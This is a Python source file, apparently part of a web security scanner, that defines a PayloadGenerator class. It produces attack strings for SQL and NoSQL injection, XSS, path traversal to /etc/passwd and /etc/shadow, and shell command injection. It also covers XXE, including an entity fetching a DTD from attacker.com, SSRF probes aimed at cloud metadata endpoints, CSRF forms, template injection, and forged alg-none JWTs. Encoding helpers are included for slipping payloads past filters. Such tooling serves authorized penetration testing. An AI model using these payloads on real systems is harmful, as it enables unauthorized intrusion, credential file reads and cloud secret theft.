"""Advanced payload generator for various attack types"""

import random
import string
from typing import List
from modules.payloads.wordlists import (
    SQL_INJECTION_PAYLOADS, 
    XSS_PAYLOADS, 
    LFI_PAYLOADS,
    OPEN_REDIRECT_PAYLOADS
)

class PayloadGenerator:
    
    @staticmethod
    def generate_sqli_payloads(custom: bool = False) -> List[str]:
        payloads = SQL_INJECTION_PAYLOADS.copy()
        
        if custom:
            custom_payloads = [
                f"admin' OR 1=1--",
                f"' OR '{''.join(random.choices(string.ascii_lowercase, k=5))}'='{''.join(random.choices(string.ascii_lowercase, k=5))}",
                f"{random.randint(1, 100)}' OR {random.randint(1, 100)}={random.randint(1, 100)}--",
                f"' UNION SELECT {','.join(['NULL'] * random.randint(1, 5))}--",
            ]
            payloads.extend(custom_payloads)
        
        return payloads
    
    @staticmethod
    def generate_xss_payloads(custom: bool = False) -> List[str]:
        payloads = XSS_PAYLOADS.copy()
        
        if custom:
            random_var = ''.join(random.choices(string.ascii_lowercase, k=6))
            custom_payloads = [
                f"<script>alert('{random_var}')</script>",
                f"<img src=x onerror=alert('{random_var}')>",
                f"<svg/onload=alert('{random_var}')>",
                f"javascript:alert('{random_var}')",
                f"<iframe src=javascript:alert('{random_var}')>",
            ]
            payloads.extend(custom_payloads)
        
        return payloads
    
    @staticmethod
    def generate_lfi_payloads(depth: int = 10) -> List[str]:
        payloads = LFI_PAYLOADS.copy()
        
        for i in range(1, depth + 1):
            traversal = "../" * i
            payloads.extend([
                f"{traversal}etc/passwd",
                f"{traversal}etc/shadow",
                f"{traversal}etc/group",
                f"{traversal}proc/self/environ",
                f"{traversal}var/log/apache2/access.log",
                f"{traversal}var/log/nginx/access.log",
            ])
        
        return list(set(payloads))
    
    @staticmethod
    def generate_cmdi_payloads() -> List[str]:
        commands = ["ls", "dir", "whoami", "id", "cat /etc/passwd", "type C:\\Windows\\win.ini"]
        separators = [";", "|", "&", "&&", "||", "\n", "`", "$()"]
        
        payloads = []
        for cmd in commands:
            for sep in separators:
                payloads.append(f"{sep} {cmd}")
                payloads.append(f"{sep}{cmd}")
        
        return payloads
    
    @staticmethod
    def generate_xxe_payloads() -> List[str]:
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
    
    @staticmethod
    def generate_ssrf_payloads() -> List[str]:
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://[::1]",
            "http://2130706433",
            "http://017700000001",
            "http://0x7f000001",
        ]
    
    @staticmethod
    def generate_nosql_payloads() -> List[str]:
        return [
            "{'$ne': null}",
            "{'$ne': 1}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'$where': 'this.password.match(/.*/)'}",
            "admin' || '1'=='1",
            "' || 1==1//",
            "' || 1==1%00",
        ]
    
    @staticmethod
    def generate_csrf_payloads(action_url: str, method: str = "POST") -> List[str]:
        return [
            f'<form action="{action_url}" method="{method}"><input type="submit" value="Click"></form>',
            f'<img src="{action_url}">',
            f'<iframe src="{action_url}"></iframe>',
            f'<script>fetch("{action_url}", {{method: "{method}"}})</script>',
        ]
    
    @staticmethod
    def generate_template_injection_payloads() -> List[str]:
        return [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "{{self}}",
            "${class.getClassLoader()}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ]
    
    @staticmethod
    def generate_jwt_payloads() -> List[str]:
        return [
            "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
        ]
    
    @staticmethod
    def obfuscate_payload(payload: str, method: str = "url") -> str:
        if method == "url":
            import urllib.parse
            return urllib.parse.quote(payload)
        elif method == "double_url":
            import urllib.parse
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif method == "hex":
            return ''.join([f'\\x{ord(c):02x}' for c in payload])
        elif method == "unicode":
            return ''.join([f'\\u{ord(c):04x}' for c in payload])
        elif method == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    @staticmethod
    def generate_fuzzing_strings() -> List[str]:
        return [
            "A" * 100,
            "A" * 1000,
            "A" * 10000,
            "%s" * 100,
            "%n" * 100,
            "0" * 100,
            "-1",
            "999999999",
            "null",
            "undefined",
            "NaN",
            "Infinity",
            "{{random}}",
            "${random}",
            "../" * 50,
            "\\..\\..\\..\\",
            "\x00",
            "\r\n" * 100,
        ]
